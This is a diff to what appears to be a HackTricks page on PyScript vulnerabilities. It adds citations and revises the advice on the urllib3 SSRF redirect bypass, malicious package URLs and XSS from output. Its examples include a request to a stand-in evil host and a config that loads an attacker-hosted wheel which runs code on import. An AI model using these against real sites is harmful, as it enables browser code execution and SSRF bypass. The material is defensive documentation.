@@ -8,7 +8,7 @@ PyScript is a new framework developed for integrating Python into HTML so, it ca
 
 ### Dumping / Retrieving files from the Emscripten virtual memory filesystem:
 
-`CVE ID: CVE-2022-30286`\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
 Code:
 
@@ -25,7 +25,7 @@ Result:
 
 ### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
-`CVE ID: CVE-2022-30286`\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
 Code:
 
@@ -186,38 +186,43 @@ Result:
 
 ### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
 
-`urllib3 < 2.5.0` ignores the `redirect` and `retries` parameters when it is executed **inside the Pyodide runtime** that ships with PyScript. When an attacker can influence target URLs, they may force the Python code to follow cross-domain redirects even when the developer explicitly disabled them ‑ effectively bypassing anti-SSRF logic.<sup>[[1]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` ignores the `redirect` and `retries` request parameters when used with Pyodide's browser transport. If an attacker can influence target URLs, the code may follow cross-domain redirects even when it asks urllib3 to disable them, undermining SSRF defenses.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ```html
 <script type="py">
 import urllib3
-http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
-r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+http = urllib3.PoolManager()
+r = http.request(
+    "GET",
+    "https://evil.example/302",
+    retries=False,
+    redirect=False,
+)  # ignored by affected Pyodide/browser runtimes
 print(r.status, r.url)
 </script>
 ```
 
-Patched in `urllib3 2.5.0` – upgrade the package in your PyScript image or pin a safe version in `packages = ["urllib3>=2.5.0"]`. See the official CVE entry for details.
+Upgrade to `urllib3 >= 2.5.0` for Node.js, but do not rely on urllib3 to disable redirects in browsers; validate or allow-list destinations before making requests instead.<sup>[[4]](#references)</sup>
 
 ### Arbitrary package loading & supply-chain attacks
 
-Since PyScript allows arbitrary URLs in the `packages` list, a malicious actor who can modify or inject configuration can execute **fully arbitrary Python** in the victim’s browser:
+PyScript's Pyodide configuration accepts arbitrary wheel URLs in `packages`; if an attacker can modify or inject that configuration, a subsequent import can execute attacker-controlled Python in the victim's browser.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 </py-config>
 <script type="py">
-import payload  # executes attacker-controlled code during installation
+import payload  # executes attacker-controlled code at import
 </script>
 ```
 
-*Only pure-Python wheels are required – no WebAssembly compilation step is needed.* Make sure configuration is not user-controlled and host trusted wheels on your own domain with HTTPS & SRI hashes.
+Pyodide can install pure-Python wheels from arbitrary URLs without a WebAssembly build of the package.<sup>[[6]](#references)</sup> Keep this configuration developer-controlled, allow-list exact package names or URLs, and verify remote wheel digests during build or deployment.
 
 ### Output sanitisation changes (2023+)
 
-* `print()` still injects raw HTML and is therefore XSS-prone (examples above).
-* The newer `display()` helper **escapes HTML by default** – raw markup must be wrapped in `pyscript.HTML()`.
+* In the 2022.05.1 implementation used by the legacy examples, `print()` writes `text/plain` output without HTML escaping and is therefore XSS-prone.<sup>[[8]](#references)</sup>
+* The current `display()` helper **escapes HTML by default** for plain strings; raw markup must be wrapped in `pyscript.HTML()`.<sup>[[2]](#references)</sup>
 
 ```python
 from pyscript import display, HTML
@@ -227,21 +232,27 @@ display("<b>escaped</b>")          # renders literally
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
 
-This behaviour was introduced in 2023 and is documented in the official Built-ins guide. Rely on `display()` for untrusted input and avoid calling `print()` directly.<sup>[[2]](#references)</sup>
+Use `display()` for untrusted input and do not pass untrusted strings to `HTML()`.<sup>[[2]](#references)</sup>
 
 ---
 
 ## Defensive Best Practices
 
-* **Keep packages up to date** – upgrade to `urllib3 >= 2.5.0` and regularly rebuild wheels that ship with the site.
-* **Restrict package sources** – only reference PyPI names or same-origin URLs, ideally protected with Sub-resource Integrity (SRI).
+* **Keep packages up to date** – use `urllib3 >= 2.5.0` in Node.js and review browser redirect assumptions separately.<sup>[[4]](#references)</sup>
+* **Restrict package sources** – allow-list PyPI names or exact trusted URLs, and verify remote wheel digests during build or deployment.<sup>[[5]](#references)[[6]](#references)</sup>
 * **Harden Content Security Policy** – disallow inline JavaScript (`script-src 'self' 'sha256-…'`) so that injected `<script>` blocks cannot execute.
 * **Disallow user-supplied `<py-script>` / `<script type="py">` tags** – sanitise HTML on the server before echoing it back to other users.
-* **Isolate workers** – if you do not need synchronous access to the DOM from workers, enable the `sync_main_only` flag to avoid the `SharedArrayBuffer` header requirements.
+* **Isolate workers** – if you do not need synchronous access to the DOM from workers, enable the `sync_main_only` flag to avoid `SharedArrayBuffer` and its associated CORS header requirements.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
 - [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
+- [5] [PyScript configuration documentation – packages and `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [6] [Pyodide – Loading packages](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
+- [8] [PyScript 2022.05.1 `pyscript.py` implementation](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 
 {{#include ../../banners/hacktricks-training.md}}
